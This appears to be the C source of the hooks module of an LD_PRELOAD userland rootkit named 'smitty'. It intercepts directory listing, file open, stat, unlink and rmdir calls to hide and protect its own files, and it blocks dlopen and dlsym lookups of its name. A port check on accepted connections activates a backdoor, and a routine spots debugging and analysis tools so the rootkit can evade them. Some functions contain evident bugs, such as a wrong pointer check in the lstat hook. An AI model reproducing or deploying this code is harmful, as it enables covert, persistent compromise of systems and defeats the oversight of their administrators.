#include "hooks.h"

static readdir_func_t original_readdir = NULL;
static readdir64_func_t original_readdir64 = NULL;
static execve_func_t original_execve = NULL;
static unlink_func_t original_unlink = NULL;
static rmdir_func_t original_rmdir = NULL;
static open_func_t original_open = NULL;
static openat_func_t original_openat = NULL;
static stat_func_t original_stat = NULL;
static lstat_func_t original_lstat = NULL;
static access_func_t original_access = NULL;
static accept_func_t original_accept = NULL;
static socket_func_t original_socket = NULL;
static bind_func_t original_bind = NULL;
static listen_func_t original_listen = NULL;
static connect_func_t original_connect = NULL;
static dlopen_func_t original_dlopen = NULL;
static dlsym_func_t original_dlsym = NULL;

void init_hooks(void) {
    original_readdir = (readdir_func_t)dlsym(RTLD_NEXT, "readdir");
    original_readdir64 = (readdir64_func_t)dlsym(RTLD_NEXT, "readdir64");
    original_execve = (execve_func_t)dlsym(RTLD_NEXT, "execve");
    original_unlink = (unlink_func_t)dlsym(RTLD_NEXT, "unlink");
    original_rmdir = (rmdir_func_t)dlsym(RTLD_NEXT, "rmdir");
    original_open = (open_func_t)dlsym(RTLD_NEXT, "open");
    original_openat = (openat_func_t)dlsym(RTLD_NEXT, "openat");
    original_stat = (stat_func_t)dlsym(RTLD_NEXT, "stat");
    original_lstat = (lstat_func_t)dlsym(RTLD_NEXT, "lstat");
    original_access = (access_func_t)dlsym(RTLD_NEXT, "access");
    original_accept = (accept_func_t)dlsym(RTLD_NEXT, "accept");
    original_socket = (socket_func_t)dlsym(RTLD_NEXT, "socket");
    original_bind = (bind_func_t)dlsym(RTLD_NEXT, "bind");
    original_listen = (listen_func_t)dlsym(RTLD_NEXT, "listen");
    original_connect = (connect_func_t)dlsym(RTLD_NEXT, "connect");
    original_dlopen = (dlopen_func_t)dlsym(RTLD_NEXT, "dlopen");
    original_dlsym = (dlsym_func_t)dlsym(RTLD_NEXT, "dlsym");
}

struct dirent* hooked_readdir(DIR* dirp) {
    if (!original_readdir) {
        original_readdir = (readdir_func_t)dlsym(RTLD_NEXT, "readdir");
    }
    
    struct dirent* entry;
    do {
        entry = original_readdir(dirp);
        if (entry && is_hidden_file(entry->d_name)) {
            continue;
        }
    } while (entry && is_hidden_file(entry->d_name));
    
    return entry;
}

int hooked_readdir64(DIR* dirp, struct dirent64* entry, struct dirent64** result) {
    if (!original_readdir64) {
        original_readdir64 = (readdir64_func_t)dlsym(RTLD_NEXT, "readdir64");
    }
    
    int ret;
    do {
        ret = original_readdir64(dirp, entry, result);
        if (ret == 0 && *result && is_hidden_file((*result)->d_name)) {
            continue;
        }
    } while (ret == 0 && *result && is_hidden_file((*result)->d_name));
    
    return ret;
}

int hooked_execve(const char* pathname, char* const argv[], char* const envp[]) {
    if (!original_execve) {
        original_execve = (execve_func_t)dlsym(RTLD_NEXT, "execve");
    }
    
    if (strstr(pathname, "smitty") != NULL) {
        return -1;
    }
    
    return original_execve(pathname, argv, envp);
}

int hooked_unlink(const char* pathname) {
    if (!original_unlink) {
        original_unlink = (unlink_func_t)dlsym(RTLD_NEXT, "unlink");
    }
    
    if (is_hidden_file(pathname)) {
        return 0;
    }
    
    return original_unlink(pathname);
}

int hooked_rmdir(const char* pathname) {
    if (!original_rmdir) {
        original_rmdir = (rmdir_func_t)dlsym(RTLD_NEXT, "rmdir");
    }
    
    if (is_hidden_file(pathname)) {
        return 0;
    }
    
    return original_rmdir(pathname);
}

int hooked_open(const char* pathname, int flags, ...) {
    if (!original_open) {
        original_open = (open_func_t)dlsym(RTLD_NEXT, "open");
    }
    
    if (is_hidden_file(pathname)) {
        return -1;
    }
    
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    
    return original_open(pathname, flags, mode);
}

int hooked_openat(int dirfd, const char* pathname, int flags, ...) {
    if (!original_openat) {
        original_openat = (openat_func_t)dlsym(RTLD_NEXT, "openat");
    }
    
    if (is_hidden_file(pathname)) {
        return -1;
    }
    
    va_list args;
    va_start(args, flags);
    mode_t mode = va_arg(args, mode_t);
    va_end(args);
    
    return original_openat(dirfd, pathname, flags, mode);
}

int hooked_stat(const char* pathname, struct stat* statbuf) {
    if (!original_stat) {
        original_stat = (stat_func_t)dlsym(RTLD_NEXT, "stat");
    }
    
    if (is_hidden_file(pathname)) {
        return -1;
    }
    
    return original_stat(pathname, statbuf);
}

int hooked_lstat(const char* pathname, struct stat* statbuf) {
    if (!lstat) {
        original_lstat = (lstat_func_t)dlsym(RTLD_NEXT, "lstat");
    }
    
    if (is_hidden_file(pathname)) {
        return -1;
    }
    
    return original_lstat(pathname, statbuf);
}

int hooked_access(const char* pathname, int mode) {
    if (!original_access) {
        original_access = (access_func_t)dlsym(RTLD_NEXT, "access");
    }
    
    if (is_hidden_file(pathname)) {
        return -1;
    }
    
    return original_access(pathname, mode);
}

int hooked_accept(int sockfd, struct sockaddr* addr, socklen_t* addrlen) {
    if (!original_accept) {
        original_accept = (accept_func_t)dlsym(RTLD_NEXT, "accept");
    }
    
    check_auto_uninstall();
    
    int result = original_accept(sockfd, addr, addrlen);
    
    if (result >= 0 && addr) {
        struct sockaddr_in* sin = (struct sockaddr_in*)addr;
        if (sin->sin_port == htons(BACKDOOR_PORT)) {
            activate_backdoor();
        }
    }
    
    return result;
}

int hooked_socket(int domain, int type, int protocol) {
    if (!original_socket) {
        original_socket = (socket_func_t)dlsym(RTLD_NEXT, "socket");
    }
    
    check_auto_uninstall();
    return original_socket(domain, type, protocol);
}

int hooked_bind(int sockfd, const struct sockaddr* addr, socklen_t addrlen) {
    if (!original_bind) {
        original_bind = (bind_func_t)dlsym(RTLD_NEXT, "bind");
    }
    
    check_auto_uninstall();
    return original_bind(sockfd, addr, addrlen);
}

int hooked_listen(int sockfd, int backlog) {
    if (!original_listen) {
        original_listen = (listen_func_t)dlsym(RTLD_NEXT, "listen");
    }
    
    check_auto_uninstall();
    return original_listen(sockfd, backlog);
}

int hooked_connect(int sockfd, const struct sockaddr* addr, socklen_t addrlen) {
    if (!original_connect) {
        original_connect = (connect_func_t)dlsym(RTLD_NEXT, "connect");
    }
    
    check_auto_uninstall();
    return original_connect(sockfd, addr, addrlen);
}

void* hooked_dlopen(const char* filename, int flags) {
    if (!original_dlopen) {
        original_dlopen = (dlopen_func_t)dlsym(RTLD_NEXT, "dlopen");
    }
    
    if (filename && strstr(filename, "smitty")) {
        return NULL;
    }
    
    return original_dlopen(filename, flags);
}

void* hooked_dlsym(void* handle, const char* symbol) {
    if (!original_dlsym) {
        original_dlsym = (dlsym_func_t)dlsym(RTLD_NEXT, "dlsym");
    }
    
    if (symbol && (strstr(symbol, "smitty") || strstr(symbol, "hook"))) {
        return NULL;
    }
    
    return original_dlsym(handle, symbol);
}

void check_detection_tools(void) {
    static time_t last_check = 0;
    time_t now = time(NULL);
    
    if (now - last_check < 3) return;
    last_check = now;
    
    FILE* proc_self = fopen("/proc/self/cmdline", "r");
    if (proc_self) {
        char cmdline[1024];
        fread(cmdline, 1, sizeof(cmdline) - 1, proc_self);
        fclose(proc_self);
        
        if (strstr(cmdline, "ldd") || strstr(cmdline, "strace") || 
            strstr(cmdline, "gdb") || strstr(cmdline, "strings") ||
            strstr(cmdline, "objdump") || strstr(cmdline, "nm")) {
            auto_uninstall_mode = 1;
            sleep(1);
            auto_uninstall_mode = 0;
        }
    }
}
